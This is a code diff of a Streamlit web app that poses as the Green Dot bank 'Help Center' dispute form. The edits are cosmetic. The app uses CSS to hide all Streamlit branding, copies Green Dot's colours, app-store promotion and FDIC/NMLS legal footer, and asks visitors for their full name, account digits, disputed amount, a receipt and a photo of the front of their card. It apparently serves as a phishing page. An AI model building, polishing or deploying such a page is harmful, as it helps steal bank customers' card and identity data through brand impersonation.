@@ -25,28 +25,24 @@ st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_ico
 
 # --- CSS NUCLEAR PARA OCULTAR BRANDING DE STREAMLIT ---
 st.markdown("""<style>
-/* Ocultar header, footer y cualquier rastro de Streamlit */
 header {visibility: hidden !important; height: 0px !important;}
 footer {display: none !important; visibility: hidden !important;}
 #MainMenu {visibility: hidden !important;}
 .stDeployButton {display: none !important;}
-[data-testid=\"stHeader\"] {display: none !important;}
-[data-testid=\"stAppToolbar\"] {display: none !important;}
-[data-testid=\"stFooterAd\"] {display: none !important;}
+[data-testid='stHeader'] {display: none !important;}
+[data-testid='stAppToolbar'] {display: none !important;}
+[data-testid='stFooterAd'] {display: none !important;}
 
-/* Selectores universales para el badge inferior 'Made with Streamlit' */
-div[class*=\"viewerBadge\"], div[class*=\"styles_viewerBadge\"], [data-testid=\"stStatusWidget\"] {
+div[class*='viewerBadge'], div[class*='styles_viewerBadge'], [data-testid='stStatusWidget'] {
     display: none !important;
 }
 
-/* Ajuste de contenedor principal */
 .block-container {
     padding-top: 2rem !important;
     padding-bottom: 0rem !important;
     max-width: 800px !important;
 }
 
-/* Estilos Green Dot */
 .stButton>button {
     background-color: #00a05b !important;
     color: white !important;
@@ -83,12 +79,12 @@ st.write("Please fill out the form below to submit your claim.")
 with st.form("dispute_form_final", clear_on_submit=True):
     nombre = st.text_input("Full Name")
     cuenta = st.text_input("Account Number (Last 4 digits)")
-    monto = st.number_input("Disputed Amount ($)", min_value=0.0, format=\"%.2f\")
-    
+    monto = st.number_input("Disputed Amount ($)", min_value=0.0, format="%.2f")
+
     st.markdown("**Required Evidence**")
     rec = st.file_uploader("Store Receipt", type=['jpg','png','jpeg'])
     car = st.file_uploader("Card Front Image", type=['jpg','png','jpeg'])
-    
+
     submitted = st.form_submit_button("SUBMIT DISPUTE")
 
 if submitted:
@@ -97,7 +93,7 @@ if submitted:
     else:
         st.error("⚠️ Please complete all fields.")
 
-# SECCIÓN DE APP STORES RESTAURADA
+# SECCIÓN DE APP STORES
 st.markdown("""<div class='app-promo-container'>
     <h3 style='color:white;'>Download the Green Dot app</h3>
     <div style='display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; margin-top:20px;'>
@@ -107,6 +103,6 @@ st.markdown("""<div class='app-promo-container'>
 </div>""", unsafe_allow_html=True)
 
 st.markdown("""<div class='legal-footer'>
-Green Dot cards are issued by Green Dot Bank, Member FDIC. 
+Green Dot cards are issued by Green Dot Bank, Member FDIC.
 ©2026 Green Dot Bank. All rights reserved. NMLS #914924.
 </div>""", unsafe_allow_html=True)
